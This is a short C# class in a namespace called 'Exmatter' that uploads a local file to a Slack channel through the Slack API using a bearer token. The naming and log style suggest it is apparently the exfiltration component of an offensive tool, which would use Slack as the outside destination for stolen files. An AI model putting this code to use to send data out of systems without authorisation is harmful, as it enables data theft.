using System;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading.Tasks;
using System.IO;
using System.Net;

namespace Exmatter
{ 
    public class SlackUploader
    {
        private readonly string _apiUrl = "https://slack.com/api/files.upload";
        private readonly string _apiKey;
        private readonly string _slackChannel;

        public SlackUploader(string apiKey, string slackChannel)
        {
            _apiKey = apiKey;
            _slackChannel = slackChannel; 
        }

        public async Task<bool> UploadFileAsync(string filePath)
        {
            try
            {
                if (!File.Exists(filePath))
                {
                    throw new FileNotFoundException("The file does not exist.");
                }


                using (var httpClient = new HttpClient())
                {
                    httpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", _apiKey);

                    using (var formContent = new MultipartFormDataContent())
                    {
                        using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                        {
                            var fileName = Path.GetFileName(filePath);
                            formContent.Add(new StreamContent(fileStream), "file", fileName);

                            formContent.Add(new StringContent(_slackChannel), "channels");

                            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

                            using (var response = await httpClient.PostAsync(_apiUrl, formContent))
                            {
                                var content = await response.Content.ReadAsStringAsync();
                                if (response.IsSuccessStatusCode)
                                {
                                    Console.WriteLine($"[+] File uploaded successfully \"{filePath}\"");
                                }
                                else
                                {
                                    var error = await response.Content.ReadAsStringAsync();
                                    Console.WriteLine($"[!] Error: {response.StatusCode} - {error}");
                                }
                                return true;
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
                Console.WriteLine($"[!] .NET DEBUG Error: {ex}");
                return false;
            }
        }
    }
}